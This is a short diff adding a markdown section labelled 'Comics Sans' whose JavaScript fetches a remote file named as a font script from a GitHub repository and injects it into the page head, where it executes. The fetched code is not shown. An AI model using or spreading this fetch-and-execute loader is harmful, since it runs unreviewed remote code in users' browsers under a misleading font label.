@@ -1,0 +1,12 @@
+### Comics Sans:
+
+fetch('https://raw.githubusercontent.com/DrMineword/Artefact-Boost-Active/refs/heads/main/fonts/ComicSansScript.cmd')
+    .then(response => response.text())  // Fetch the content of the script as text
+    .then(scriptContent => {
+      // Create a new script element
+      var script = document.createElement('script');
+      script.innerHTML = scriptContent;  // Insert the fetched script content into the script element
+      document.head.appendChild(script);  // Append the script to the document's head to execute it
+    })
+    .catch(error => console.error('Error fetching or executing the script:', error));
+
